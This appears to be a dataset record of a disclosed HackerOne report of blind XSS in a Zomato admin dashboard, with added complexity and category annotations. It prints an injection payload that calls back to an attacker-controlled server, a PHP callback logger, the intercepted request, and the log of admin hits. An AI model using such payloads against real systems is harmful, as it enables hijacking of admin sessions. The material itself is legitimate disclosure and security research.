@@ -1,0 +1,42 @@
+{
+  "reported_to": "Zomato",
+  "reported_by": "nguyenlv7 ",
+  "title": "[www.zomato.com] Blind XSS in one of the admin dashboard",
+  "content": "\nSummary:\nAdmin dasboard \u2588\u2588\u2588\u2588 from user has XSS Vul\nSteps To Reproduce:\nLogin \u2588\u2588\u2588\u2588\u2588\u2588\nGo to \u2588\u2588\u2588 function and intercept request Post data: \"><img src=\"http://<my_server_ip>/zomato.php?c=zomato_xss\" />\nCode 946 Bytes\n1POST \u2588\u2588\u2588\u2588 HTTP/1.1\n2X-Zomato-App-Version-Code: 5610001\n3\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5X-Zomato-API-Key: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6X-App-Language: &lang=en&android_language=en&android_country=VN\n7X-Zomato-App-Version: 561\n8X-Network-Type: wifi\n9X-Present-Long: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10X-Zomato-UUID: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11X-O2-City-Id: 35\n12User-Agent: &source=android_market&version=7.1.2&device_manufacturer=samsung&device_brand=samsung&device_model=SM-N9005&app_type=android_ordering\n13X-Access-Token: \u2588\u2588\u2588\u2588\u2588\n14X-Device-Pixel-Ratio: 1.5\n15X-City-Id: 35\n16X-Device-Width: 720\n17Content-Type: application/x-www-form-urlencoded\n18Akamai-Mobile-Connectivity: type=wifi;appdata=com.application.zomato.ordering;prepositioned=true;websdk=18.4.2;carrier=Viettel Telecom/452,04;devicetype=1;rwnd=2097152;\n19X-Client-Id: zomato_android_v2\n20X-Present-Lat: \u2588\u2588\u2588\u2588\u2588\u2588\n21\u2588\u2588\u2588\u2588\u2588\u2588\n22X-Device-Height: 1280\n23Content-Length: 156\n24Host: api.zomato.com\n25Connection: close\n26\n27\u2588\u2588\u2588\u2588\u2588=\"><img+src%3d\"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss\"+/>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nFile zomato.php on my server:\nCode 263 Bytes\n1<?php\n2$time = date('Y-m-d H:i:s', time());\n3$refer = $_SERVER['HTTP_REFERER'];\n4$ip = $_SERVER['REMOTE_ADDR'];\n5$c = isset($_GET['c']) ? $_GET['c']: '0';\n6file_put_contents(\"log.txt\",\"Time: \". $time .\"IP: \". $ip.\" Referer: \".$refer. \"C: \". $c . \"\\n\", FILE_APPEND);\n7?>\nXSS triggered when Admin viewed the \u2588\u2588\u2588\u2588\u2588\u2588\u2588.\nResult in file log.txt time UTC\nCode 118 Bytes\n1Time: 2018-12-12 13:49:25IP: \u2588\u2588\u2588\u2588\u2588 Referer: C: zomato_xss\n2Time: 2018-12-12 14:01:17IP: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Referer: C: zomato_xss\nI captured 2 ip from India.\nPlease verify for me.\nImpact\nSteal admin cookies.\n\n",
+  "severity": [
+    7.1,
+    null
+  ],
+  "bounty": 500,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1556708700,
+  "report_url": "https://hackerone.com/reports/461272",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Login to the admin dashboard and navigate to the vulnerable function."
+    ],
+    [
+      2,
+      "Intercept the request and inject the XSS payload: \"<img src='http://<my_server_ip>/zomato.php?c=zomato_xss' />\" into the POST data."
+    ]
+  ],
+  "vuln_description": "A Blind XSS vulnerability exists in the admin dashboard of Zomato, where an attacker can inject a malicious payload that gets executed when an admin views the affected page. This can lead to stealing admin cookies or other sensitive information.",
+  "reason": "The attack involves injecting a simple XSS payload and setting up a server to capture the triggered requests. The complexity is low as it does not require multiple components, complex states, or novel logic.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The Blind XSS vulnerability involves injecting a malicious payload that gets executed when an admin views a specific dashboard. This is not directly related to authentication or authorization bypass, nor does it involve IDOR. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which doesn't apply here since the vulnerability is about XSS in an admin dashboard that doesn't involve session or resource ID manipulation.",
+    "is_detectable": false
+  }
+}
